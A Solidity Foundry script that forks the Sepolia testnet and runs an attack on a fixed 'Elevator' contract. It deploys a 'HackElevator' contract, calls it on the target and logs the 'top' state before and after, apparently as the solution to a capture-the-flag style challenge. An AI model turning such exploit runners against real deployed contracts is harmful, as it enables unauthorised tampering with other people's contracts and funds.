// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

import {Script, console} from "forge-std/Script.sol";

import {Elevator, HackElevator} from "../src/Elevator.sol";

contract ElevatorScript is Script {
    function setUp() public {}

    function run() public {
        hackContract();
    }

    function hackContract() internal {
        uint256 sepolia = vm.createFork(vm.rpcUrl("sepolia"));

        address elevatorContractAddress = 0xEe88a9Be3f72C09Ae0cCf30C717Bc7c094E0567E;
        Elevator stakeContract = Elevator(elevatorContractAddress);

        vm.selectFork(sepolia);

        vm.startBroadcast();

        console.log("Starting Hacking");

        console.log("InitialState:", stakeContract.top());

        HackElevator a = new HackElevator();

        a.hackElevator(elevatorContractAddress);

        console.log("FinalState:", stakeContract.top());

        vm.stopBroadcast();
    }
}
